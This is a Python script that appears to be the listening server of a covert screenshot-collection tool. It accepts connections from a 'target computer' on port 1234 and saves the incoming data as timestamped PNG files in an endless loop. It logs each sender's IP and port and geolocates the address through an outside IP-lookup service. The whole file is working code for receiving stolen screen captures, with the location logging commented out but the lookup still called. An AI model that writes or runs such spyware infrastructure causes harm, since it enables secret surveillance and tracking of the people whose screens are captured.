import socket
import requests
import get_time

HOST = '0.0.0.0'  # 监听所有可用的网络接口
PORT = 1234
BUFFER_SIZE = 4096

open('logs.txt', 'a')


def save(log):
    print(log)
    f = open('logs.txt', 'a')
    f.write(log + '\n')
    f.close()


def get_current_datetime_str():
    return (f"{get_time.get_time_dict()['Year']}-{get_time.get_time_dict()['Month']}-{get_time.get_time_dict()['Day']}"
            f"  {get_time.get_time_dict()['Hour']}:{get_time.get_time_dict()['Minute']}:{get_time.get_time_dict()['Second']}")


def get_ip_info(ip_address):
    api_url = f"https://ipapi.co/{ip_address}/json/"

    try:
        response = requests.get(api_url)
        data = response.json()
        return data
    except requests.RequestException as e:
        save(f"Error fetching data: {e}")
        return None


def receive_file(filename, time):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen()

        save("等待连接...")
        conn, addr = server_socket.accept()

        with conn:
            save(f'已连接到目标计算机\n  IP地址：{addr[0]}\n  对方连接端口：{addr[1]}')
            position = get_ip_info(addr[0])
            save(f'时间：{time}')
            with open(filename, 'wb') as file:
                while True:
                    data = conn.recv(BUFFER_SIZE)
                    if not data:
                        break
                    file.write(data)
            # try:
            #     save(
            #         f"位置信息\n  国家：{position['country_name']}\n  省份：{position['region']}\n  城市：{position['city']}\n  经纬：{position['latitude'], position['longitude']}")
            # except KeyError:
            #     save('地理位置查询失败')
            save(f'文件{filename}接收完成')


if __name__ == '__main__':
    save('\n--------------------------------------\n')
    while True:
        nowtime = get_current_datetime_str()
        filename_to_receive = f"sc{nowtime.replace(':', '-')}.png"
        receive_file(filename_to_receive, nowtime)
        save('\n----------\n')
